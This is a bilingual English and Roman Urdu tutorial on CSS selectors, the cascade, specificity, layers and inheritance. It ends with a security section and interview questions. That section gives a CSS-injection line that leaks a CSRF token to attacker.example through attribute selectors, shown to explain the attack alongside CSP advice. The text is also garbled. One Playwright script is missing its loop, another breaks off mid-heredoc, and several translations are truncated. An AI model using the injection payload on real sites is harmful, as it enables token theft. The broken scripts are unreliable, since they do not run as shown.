<BigIdea>
<Tr>
<En>
**CSS** (Cascading Style Sheets) describes how HTML looks: colours, fonts, spacing, layout. A **rule** is a **selector** (which elements) plus **declarations** (`property: value;`). Selectors target elements by **type** (`p`), **class** (`.card`), **id** (`#main`), **attribute** (`[type="email"]`), **position** (`nav a`, `ul > li`, `h2 + p`), **state** (`:hover`, `:focus-visible`, `:checked`) and **parts** (`::before`, `::placeholder`). When several rules set the same property, the **cascade** picks a winner: `!important` and **layers** first, then **specificity** (ids beat classes beat elements, a score like `(1,2,0)`), then **source order** (later wins). Some properties (`color`, `font`) are **inherited**. Keep specificity low, style with classes, avoid ids and `!important`, and use DevTools to see which rule won.
</En>
<Ur>
**CSS** (Cascading Style Sheets) batata hai HTML kaisa dikhe: rang, fonts, faasle, layout. **Rule** ek **selector** (kaun se elements) aur **declarations** (`property: value;`) hai. Selectors elements ko **type** (`p`), **class** (`.card`), **id** (`#main`), **attribute** (`[type="email"]`), **jagah** (`nav a`, `ul > li`, `h2 + p`), **halat** (`:hover`, `:focus-visible`, `:checked`) aur **hisson** (`::before`, `::placeholder`) se chunte hain. Jab kai rules ek hi property set karen to **cascade** jeetne wala chunta hai: pehle `!important` aur **layers**, phir **specificity** (ids classes se, classes elements se jeet ti hain, `(1,2,0)` jaisa score), phir **likhne ki tarteeb** (baad wala jeet ta hai). Kuch properties (`color`, `font`) **wirse me** milti hain. Specificity kam rakhein, classes se style karein, ids aur `!important` se bachen, aur DevTools se dekhein kaun sa rule jeeta.
</Ur>
</Tr>

## At a glance

<Glance>
<What>
<Tr>
<En>

A CSS rule, piece by piece:

```text
/* selector        declaration block */
.card h2 {
  color: navy;          /* property: value; */
  font-size: 1.5rem;
  margin-block: 0 8px;
}
```

`.card h2` is the **selector** (every `<h2>` inside an element with class `card`); `{ }` holds the **declaration block**; each `property: value;` is a **declaration**; `/* ... */` is a comment (CSS has no `//`). The browser parses HTML into the **DOM** and CSS into the **CSSOM**, runs the **cascade** for every element and property (falling back to **inheritance** or the **initial value**), computes values, lays out and paints.

</En>
<Ur>

CSS rule, tukra tukra:

```text
/* selector        declaration block */
.card h2 {
  color: navy;          /* property: value; */
  font-size: 1.5rem;
  margin-block: 0 8px;
}
```

`.card h2` **selector** hai (class `card` wale element ke andar har `<h2>`); `{ }` me **declaration block** hai; har `property: value;` ek **declaration** hai; `/* ... */` comment hai (CSS me `//` nahi). Browser HTML ko **DOM** aur CSS ko **CSSOM** me parhta hai, har element aur property ke liye **cascade** chalata hai (warna **wirasat** ya **initial value**), values nikalta hai, layout banata aur paint karta hai.

<Why>
<Tr>
<En>

- **Every** site uses CSS. Even with Tailwind or a component library you still write selectors and meet cascade problems.
- "Why isn't my style applying?" is the most common CSS question; the answer is almost always specificity, order, inheritance or a selector that doesn't match.
- Good habits make CSS **predictable**; bad ones (ids, deep nesting, `!important`) create stylesheets nobody dares touch.
- Selectors also power `document.querySelector`, Playwright/Cypress tests and scraping.

</En>

- **Har** site CSS istemal karti hai. Tailwind ya component library ke saath bhi selectors likhte aur cascade ke masail se milte hain.

- Achhi aadaten CSS ko **umeed ke mutabiq** banati hain; buri (ids, gehri nesting, `!important`) aisi stylesheets banati hain jinhen koi chhoone se darta hai.

## Picture it

<Tr>
<En>

HTML is the **skeleton and organs** of a page; CSS is the **clothing and make-up**. Imagine giving a tailor instructions: "everyone wears white shirts", "the sales team wears blue", "Sam wears red". Sam is in sales, so two instructions apply and disagree. The tailor's rule: **the more specific instruction wins** (about Sam personally beats about the team, which beats about everyone). If two are equally specific, **the one written later** wins. That decision process is the **cascade**, and "how specific" is **specificity**.

</En>
<Ur>

HTML page ka **dhaancha aur andaruni aaza** hai; CSS **kapre aur make-up**. Sochein aap darzi ko hidayaten dete hain: "sab safed shirt pehnen", "sales team neeli", "Sam laal". Sam sales me hai, isliye do hidayaten lagti hain aur takrati hain. Darzi ka qaida: **zyada khaas hidayat jeet ti hai** (Sam ke baare me wali team wali se, aur team wali sab wali se). Agar dono barabar khaas hon to **baad me likhi** jeet ti hai. Faisle ka yahi amal **cascade** hai, aur "kitni khaas" **specificity** hai.

</Ur>
</Tr>

<Step title="Three ways to add CSS">

<Tr>
<En>

1. **External stylesheet:** a `.css` file linked with `<link rel="stylesheet" href="/styles.css">`: cached and shared by all pages, the default for real sites.
2. **Internal:** a `<style>` element in the head: small demos, emails, critical CSS.
3. **Inline:** a `style` attribute on one element: beats almost every selector and can't use pseudo-classes or media queries, so keep it for values set by JavaScript or per-element CSS variables (`style="--progress: 40%"`).

Frameworks (CSS Modules, Tailwind, Sass) compile to external files.

```text
<head>
  <link rel="stylesheet" href="/styles.css">
  <style>
    h1 { color: navy; }
  </style>
</head>
<body>
  <h1>Mango Shop</h1>
  <p style="color: darkgreen">Fresh Kent mangoes today.</p>
</body>
```

</En>
<Ur>

1. **Bahar ki stylesheet:** `<link rel="stylesheet" href="/styles.css">` se juri `.css` file: cache hoti aur saare pages me saanjhi, asli sites ka default.
2. **Andar ki:** head me `<style>` element: chhote demos, emails, critical CSS.
3. **Inline:** ek element par `style` attribute: taqreeban har selector se jeet ta hai aur pseudo-classes ya media queries nahi le sakta, isliye sirf JavaScript ki set ki values ya element ke CSS variables (`style="--progress: 40%"`) ke liye.

Frameworks (CSS Modules, Tailwind, Sass) bahar ki files banate hain.

<Step title="Basic selectors">

<Tr>
<En>

| Selector | Matches | Example |
| --- | --- | --- |
| `*` | Every element | `* { box-sizing: border-box; }` |
| `p` | Every element of that type | `p { line-height: 1.6; }` |
| `.price` | Every element with that class | `<span class="price">` |
| `#cart` | The element with that id | `<div id="cart">` |
| `p.note` | A `p` that also has class `note` | no space: same element |
| `.btn.primary` | Elements with **both** classes | `<button class="btn primary">` |
| `h1, h2, h3` | A **list**: any of these | grouping |

Use **classes** for almost all styling, type selectors for base styles, ids mainly for links and JavaScript. An element can have many classes; an id must be unique. Below, a real browser shows what each selector matches with `querySelectorAll`, the same engine CSS uses.

</En>
<Ur>

| Selector | Kis se milta hai | Misaal |
| --- | --- | --- |
| `*` | Har element | `* { box-sizing: border-box; }` |
| `p` | Us type ka har element | `p { line-height: 1.6; }` |
| `.price` | Us class wala har element | `<span class="price">` |
| `#cart` | Us id wala element | `<div id="cart">` |
| `p.note` | Aisa `p` jis par class `note` bhi ho | space nahi: wahi element |
| `.btn.primary` | **Dono** classes wale elements | `<button class="btn primary">` |
| `h1, h2, h3` | **List**: in me se koi bhi | group |

Taqreeban saari styling **classes** se, bunyadi styles type selectors se, ids zyada tar links aur JavaScript ke liye. Element ki kai classes ho sakti hain; id munfarid ho. Neeche asli browser `querySelectorAll` se dikhata hai har selector kis se milta hai, wahi engine jo CSS istemal karta hai.

</Ur>
</Tr>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<main id="shop">
  <h1>Mango Shop</h1>
  <p class="note">Delivery in 2 days.</p>
  <ul>
    <li class="product">Kent <span class="price">$9.00</span></li>
    <li class="product sale">Keitt <span class="price">$11.00</span></li>
    <li class="product sold-out">Ataulfo <span class="price">$13.00</span></li>
  </ul>
  <button class="btn primary" type="button">Checkout</button>
  <button class="btn" type="button">Continue shopping</button>
</main>"""
selectors = ["li", ".product", ".product.sale", "#shop", ".btn", ".btn.primary", "h1, .note", ".price"]
with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.set_content(html)

        print(f"{sel:14} -> {len(found)}  {found}")

PY
```

<Step title="Attribute selectors">

<Tr>
<En>

| Selector | Matches when the attribute… |
| --- | --- |
| `[disabled]` | exists |
| `[type="email"]` | equals exactly |
| `[href^="https"]` | starts with |
| `[href$=".pdf"]` | ends with |
| `[href*="example"]` | contains |
| `[class~="sale"]` | contains the whole word in a space-separated list |
| `[lang\|="en"]` | equals `en` or starts with `en-` |
| `[type="email" i]` | equals, case-insensitively |

They style elements without extra classes: external links, PDFs, required fields, input types and ARIA states. Styling by ARIA state (`button[aria-expanded="true"] .icon { rotate: 180deg; }`) keeps visual and accessibility state in sync automatically.

</En>
<Ur>

| Selector | Tab milta hai jab attribute… |
| --- | --- |
| `[disabled]` | maujood ho |
| `[type="email"]` | bilkul barabar ho |
| `[href^="https"]` | is se shuru ho |
| `[href$=".pdf"]` | is par khatam ho |
| `[href*="example"]` | is me shamil ho |
| `[class~="sale"]` | spaces wali list me poora lafz ho |
| `[lang\|="en"]` | `en` ho ya `en-` se shuru ho |
| `[type="email" i]` | bare chhote harf ke farq ke baghair barabar ho |

Ye izafi classes ke baghair style karte hain: bahar ke links, PDFs, lazmi fields, input types aur ARIA states. ARIA state se styling (`button[aria-expanded="true"] .icon { rotate: 180deg; }`) nazar aane wali aur rasai wali halat ko khud barabar rakhti hai.

</Ur>
</Tr>

<Step title="Combinators: relationships between elements">

<Tr>
<En>

| Combinator | Name | Matches |
| --- | --- | --- |
| `A B` (space) | Descendant | B anywhere inside A |
| `A > B` | Child | B directly inside A |
| `A + B` | Next sibling | B immediately after A, same parent |
| `A ~ B` | Subsequent sibling | any B after A, same parent |

They style by position: links in the nav, the paragraph after a heading. Keep them short: `nav a` is fine; `body main section .content ul li a span` breaks when HTML changes and is highly specific. Browsers read selectors **right to left** (each `a`, then walk up for a `nav`), which is fast, so don't worry about selector performance.

</En>
<Ur>

| Combinator | Naam | Kis se milta hai |
| --- | --- | --- |
| `A B` (space) | Descendant | A ke andar kahin bhi B |
| `A > B` | Child | A ke seedha andar B |
| `A + B` | Agla sibling | Usi parent me A ke fauran baad B |
| `A ~ B` | Baad ke siblings | Usi parent me A ke baad koi bhi B |

Ye jagah se style karte hain: nav ke links, heading ke baad ka paragraph. Chhote rakhein: `nav a` theek; `body main section .content ul li a span` HTML badalte hi toot ta hai aur bohot khaas hai. Browsers selectors **daayen se baayen** parhte hain (har `a`, phir upar `nav` dhoondhte hain), jo tez hai, isliye selector ki raftar ki fikr na karein.

</Ur>
</Tr>

```bash
python3 - <<'PY'
from playwright.sync_api import sync_playwright
html = """<!DOCTYPE html><title>t</title>
<ul class="menu">
  <li>Fruit
    <ul><li>Mangoes</li><li>Bananas</li></ul>
  </li>
  <li>Vegetables</li>
</ul>
<h2>Delivery</h2>
<p>First paragraph after h2</p>
<p>Second paragraph</p>
```

<Step title="Pseudo-classes: state and position">

<Tr>
<En>

A pseudo-class (one colon) selects elements in a **state** or **position**:

- **User action:** `:hover`, `:active`, `:focus`, `:focus-visible`, `:focus-within`.
- **Links:** `:link`, `:visited`.
- **Forms:** `:checked`, `:disabled`, `:required`, `:valid`, `:invalid`, `:user-invalid`, `:placeholder-shown`.
- **Tree:** `:first-child`, `:last-child`, `:nth-child(2)`, `:nth-child(odd)`, `:nth-child(3n+1)`, `:first-of-type`, `:empty`, `:root`.
- **Logic:** `:not()`, `:is()`, `:where()`, `:has()`. **Other:** `:target`.

In `:nth-child(an+b)`, `n` counts 0, 1, 2…: `2n` is even, `odd` is 1, 3, 5, `3n+1` is 1, 4, 7, `-n+3` the first three. Use `:user-invalid` rather than `:invalid`, so empty forms don't start red. Hover, focus and tick the boxes below.

</En>
<Ur>

Pseudo-class (ek colon) elements ko **halat** ya **jagah** se chunti hai:

- **User ka amal:** `:hover`, `:active`, `:focus`, `:focus-visible`, `:focus-within`.
- **Links:** `:link`, `:visited`.
- **Forms:** `:checked`, `:disabled`, `:required`, `:valid`, `:invalid`, `:user-invalid`, `:placeholder-shown`.
- **Darakht:** `:first-child`, `:last-child`, `:nth-child(2)`, `:nth-child(odd)`, `:nth-child(3n+1)`, `:first-of-type`, `:empty`, `:root`.
- **Mantiq:** `:not()`, `:is()`, `:where()`, `:has()`. **Doosri:** `:target`.

`:nth-child(an+b)` me `n` 0, 1, 2… ginta hai: `2n` juft, `odd` 1, 3, 5, `3n+1` 1, 4, 7, `-n+3` pehle teen. `:invalid` ke bajaye `:user-invalid` lein, taa ke khaali forms shuru se laal na hon. Neeche hover, focus aur boxes tick karein.

</Ur>
</Tr>

<Step title=":not, :is, :where and :has">

<Tr>
<En>

- **`:not(X)`** matches elements that **don't** match X: `.btn:not(.primary)`, `li:not(:last-child)`.
- **`:is(A, B)`** matches any in the list: `:is(h1, h2, h3) a` instead of three selectors.
- **`:where(A, B)`** is the same as `:is` but has **zero** specificity, so library defaults are easy to override.
- **`:has(X)`** matches if X matches something relative to it: `.card:has(img)`, `form:has(:user-invalid)`.

`:not`, `:is` and `:has` take their **most specific** argument's specificity; `:where` counts zero. `:has` works in all modern browsers since late 2023.

</En>
<Ur>

- **`:not(X)`** un elements se milta hai jo X se **nahi** milte: `.btn:not(.primary)`, `li:not(:last-child)`.

<Step title="The cascade: which declaration wins">

<Tr>
<En>

When several declarations set the same property, the browser compares **in order**, stopping at the first difference:

1. **Origin and importance:** browser defaults < user styles < your CSS; `!important` reverses that order.
2. **Context:** Shadow DOM inside vs outside.
3. **Inline styles:** the `style` attribute beats any selector.
4. **Cascade layers:** later `@layer`s beat earlier ones; unlayered styles beat all layers.
5. **Specificity:** higher score wins.
6. **Order:** the last one wins.

Day to day you meet steps 5 and 6 plus inline styles and `!important`. Below, five competing rules and the colour the browser actually computed.

</En>
<Ur>

2. **Siyaq:** Shadow DOM andar vs bahar.
3. **Inline styles:** `style` attribute har selector se jeet ta hai.
4. **Cascade layers:** baad ke `@layer` pehle walon se jeet te hain; bina layer styles saari layers se.
5. **Specificity:** zyada score jeet ta hai.

<Step title="Calculating specificity">

<Tr>
<En>

Specificity is three numbers **(A, B, C)** compared left to right like version numbers:

- **A:** **id** selectors (`#cart`).
- **B:** **classes**, **attributes** and **pseudo-classes** (`.btn`, `[type="email"]`, `:hover`).
- **C:** **type** selectors and **pseudo-elements** (`p`, `::before`).
- `*` and combinators count nothing; `:is()`, `:not()`, `:has()` count as their most specific argument; `:where()` counts zero.

DevTools shows specificity when you hover a selector. Below, a small calculator (common selectors, not every edge case) sorts selectors by specificity.

</En>
<Ur>

Specificity teen numbers **(A, B, C)** hai jo version numbers ki tarah baayen se daayen mile jate hain:

- **A:** **id** selectors (`#cart`).
- **B:** **classes**, **attributes** aur **pseudo-classes** (`.btn`, `[type="email"]`, `:hover`).
- **C:** **type** selectors aur **pseudo-elements** (`p`, `::before`).
- `*` aur combinators kuch nahi ginte; `:is()`, `:not()`, `:has()` apne sab se khaas argument jitne; `:where()` sifar.

DevTools selector par hover karne par specificity dikhata hai. Neeche chhota calculator (aam selectors, har kona nahi) selectors ko specificity se tarteeb deta hai.

</Ur>
</Tr>

```bash
python3 - <<'PY'
import re

def specificity(selector):
    s = selector
    a = b = c = 0
    # :where(...) counts zero: remove it entirely
    s = re.sub(r":where\([^)]*\)", "", s)
    # :is/:not/:has count as their most specific argument
    def most_specific(m):
        nonlocal a, b, c
        best = max((specificity(part.strip()) for part in m.group(2).split(",")), default=(0, 0, 0))
        a, b, c = a + best[0], b + best[1], c + best[2]
        return ""
    s = re.sub(r":(is|not|has)\(([^)]*)\)", most_specific, s)
    c += len(re.findall(r"::[\w-]+", s)); s = re.sub(r"::[\w-]+", "", s)
    a += len(re.findall(r"#[\w-]+", s))
    b += len(re.findall(r"\.[\w-]+", s)) + len(re.findall(r"\[[^\]]+\]", s)) + len(re.findall(r":[\w-]+(\([^)]*\))?", s))
    s = re.sub(r"#[\w-]+|\.[\w-]+|\[[^\]]+\]|:[\w-]+(\([^)]*\))?", "", s)
    c += len(re.findall(r"(?<![\w-])[a-zA-Z][\w-]*", s))
    return (a, b, c)

selectors = ["*", "p", "article p", ".note", "p.note", "a:hover", "input[type=email]",
             "nav > ul li a", "#cart", "#cart .item", "li::marker", ".btn:not(.primary)",
             ":is(#main, .side) a", ":where(#main, .side) a"]
for sel in sorted(selectors, key=specificity):
    print(f"{str(specificity(sel)):10} {sel}")
PY
```

<Step title="!important, inline styles and cascade layers">

<Tr>
<En>

- **`!important`** moves a declaration above all normal ones, including inline styles; among important ones, specificity and order apply again. It's a sledgehammer: the only override is another `!important`. Keep it for must-win utilities, overriding third-party inline styles, and accessibility user stylesheets.
- **Inline styles** beat selectors but lose to stylesheet `!important`.
- **Cascade layers** (`@layer reset, base, components, utilities;`) decide priority by **layer order** instead of specificity; unlayered styles beat all layers. They cleanly isolate too-specific base or third-party CSS (`@import url(lib.css) layer(vendor);`); Tailwind v4 uses them internally. Supported in all modern browsers since 2022.

</En>
<Ur>

- **`!important`** declaration ko har aam declaration se upar le jata hai, inline styles samet; important walon ke beech specificity aur tarteeb phir lagti hai. Ye hathora hai: badalne ka wahid tareeqa doosra `!important`. Sirf lazmi jeetne wali utilities, third-party inline styles badalne aur rasai ki user stylesheets ke liye.
- **Inline styles** selectors se jeet te hain magar stylesheet ke `!important` se haarte hain.
- **Cascade layers** (`@layer reset, base, components, utilities;`) priority specificity ke bajaye **layer ki tarteeb** se tay karti hain; bina layer styles saari layers se jeet te hain. Ye bohot khaas base ya third-party CSS ko saaf alag karti hain (`@import url(lib.css) layer(vendor);`); Tailwind v4 andar inhen istemal karta hai. 2022 se har jadeed browser me.

</Ur>
</Tr>

<Step title="Inheritance and the global keywords">

<Tr>
<En>

**Inherited** properties take the parent's value when nothing sets them: mostly text ones (`color`, `font-*`, `line-height`, `text-align`, `letter-spacing`, `visibility`, `cursor`, `list-style`). Most others (`margin`, `padding`, `border`, `background`, `width`, `display`) start at their **initial** value. Keywords for any property: `inherit` (parent's value), `initial` (spec default), `unset` (inherit or initial), `revert` (browser default), and `all: unset`. That's why you set fonts once on `body`. Inherited values have **no specificity**: any rule matching the element directly, even `*`, beats them. So `.card { color: red }` doesn't recolour links inside, because the browser's own `a:link` rule matches them directly.

</En>
<Ur>

**Wirsati** properties kuch set na ho to parent ki value leti hain: zyada tar text wali (`color`, `font-*`, `line-height`, `text-align`, `letter-spacing`, `visibility`, `cursor`, `list-style`). Zyada tar doosri (`margin`, `padding`, `border`, `background`, `width`, `display`) apni **initial** value se shuru hoti hain. Har property ke keywords: `inherit` (parent ki value), `initial` (spec ka default), `unset` (inherit ya initial), `revert` (browser ka default), aur `all: unset`. Isi liye fonts ek dafa `body` par set karte hain. Wirsati values ki **koi specificity nahi**: element se seedha milne wala koi bhi rule, `*` bhi, un se jeet ta hai. Isliye `.card { color: red }` andar ke links nahi rangta, kyun ke browser ka apna `a:link` rule unhen seedha milta hai.

</Ur>
</Tr>

## Common mistakes

<Compare>
<Bad title="Specificity war">

```text
#sidebar .widget button { color: gray; }            /* (1,1,1) */
#sidebar .widget .btn.danger { color: red; }        /* (1,3,0) to beat it */
.btn.danger { color: red !important; }              /* then the sledgehammer */
```

</Bad>
<Good title="Flat classes in ordered layers">

```text
@layer base, components, utilities;
@layer components { .btn { color: gray; } .btn--danger { color: red; } }
@layer utilities { .text-red { color: #b91c1c; } }
```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **Styling with ids**, making rules hard to override.
- **Long nested selectors** (`.page .main .content ul li a`) that break when HTML changes.
- **Confusing `.a.b` (same element) with `.a .b` (descendant).**
- **Expecting non-inherited properties to inherit** (border, background, margin), or form controls to inherit fonts.
- **`:invalid` for error styles**, marking empty fields red before typing.
- **Meaningful content in `::before`/`::after`**, single colons, or forgetting `content`.
- **`:focus { outline: none }`** with no replacement.
- **Guessing instead of opening DevTools.**

</En>
<Ur>

Bachne wali mazeed ghaltiyan:

- **Ids se styling**, jis se rules badalna mushkil.
- **Lambe nested selectors** (`.page .main .content ul li a`) jo HTML badalte hi toot jayen.
- **`.a.b` (wahi element) aur `.a .b` (andar wala) me ulajhna.**
- **Ghair wirsati properties ka wirasat ki umeed** (border, background, margin), ya form controls ka fonts lena.
- **Error styles ke liye `:invalid`**, jo type se pehle khaali fields laal kar de.
- **`::before`/`::after` me ahem mawad**, ek colon, ya `content` bhoolna.
- Bina mutabadil **`:focus { outline: none }`**.
- **DevTools kholne ke bajaye andaze.**

</Ur>
</Tr>

<DeepDive title="Real world: specificity wars">

Large codebases often suffer **specificity wars**. A developer needs a red button and writes `.btn.danger`, but an older `#sidebar .widget button` (1,1,1) wins, so they write `#sidebar .widget .btn.danger` (1,3,0), and later someone overrides that with `!important`. After a few years the stylesheet is thousands of lines no one can safely change. Teams fix this by keeping specificity flat: **BEM** naming (`.card__title--large`, one class per selector), **CSS Modules** (class names scoped per component), **utility-first CSS** like Tailwind (single-class utilities), and **cascade layers** separating resets, third-party CSS, components and utilities. Bootstrap 5 and many design systems use `:where()` or layers for base styles so application CSS can override them with a single class.

</DeepDive>

<DeepDive title="Security lens">

CSS is not just decoration: it can leak data and power UI tricks, so treat untrusted CSS as untrusted code.

- **CSS injection:** if users can inject CSS (a "custom theme" field, unescaped `style` values), attribute selectors can **exfiltrate data**: `input[name="csrf"][value^="a"] { background: url(https://attacker.example/?a) }` sends a request per matching character, leaking tokens. Never put untrusted input into `<style>` or `style`, and restrict `style-src` and `img-src` with a **Content Security Policy**.
- **`:visited` privacy:** browsers limit what `:visited` can change and lie to `getComputedStyle`, so sites can't detect your history.
- **Clickjacking:** CSS can make elements invisible or overlay fake buttons; block framing with `X-Frame-Options` or CSP `frame-ancestors`.
- **Hidden isn't secret:** `display: none` text is still in the HTML; never hide data or admin links with CSS.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="How does the browser decide which CSS rule applies when several match?">
It runs the cascade. It compares origin and importance first, so important declarations and author styles have priority over normal and browser styles, then element-attached inline styles, then cascade layer order, then specificity, and finally source order, where the later declaration wins. If no declaration applies, inherited properties take the parent's value and others use their initial value.
</QA>

<QA q="How is specificity calculated?">
It is a tuple of three counts compared left to right: id selectors; classes, attribute selectors and pseudo-classes; and type selectors and pseudo-elements. The universal selector and combinators add nothing. The is, not and has pseudo-classes take the specificity of their most specific argument, and where always contributes zero. A single id beats any number of classes, and a single class beats any number of elements.
</QA>

<QA q="What is the difference between :is() and :where()?">
Both match an element if it matches any selector in their argument list. The is pseudo-class takes the specificity of its most specific argument, while where always has zero specificity, which makes it useful for base or library styles that should be easy to override.
</QA>

<QA q="What is the difference between a pseudo-class and a pseudo-element?">
A pseudo-class, written with one colon, selects an element in a particular state or position, such as hover, focus-visible, checked or nth-child. A pseudo-element, written with two colons, targets a part of an element or generated content, such as before, after, first-line, placeholder or marker.
</QA>

<QA q="Why should you avoid !important and id selectors for styling?">
They raise priority so much that later changes need equally strong or stronger declarations, which leads to escalating specificity and stylesheets that are hard to maintain. Keeping selectors to single classes, using a naming convention or scoped styles, and organising priority with cascade layers keeps the cascade predictable.
</QA>

</DeepDive>
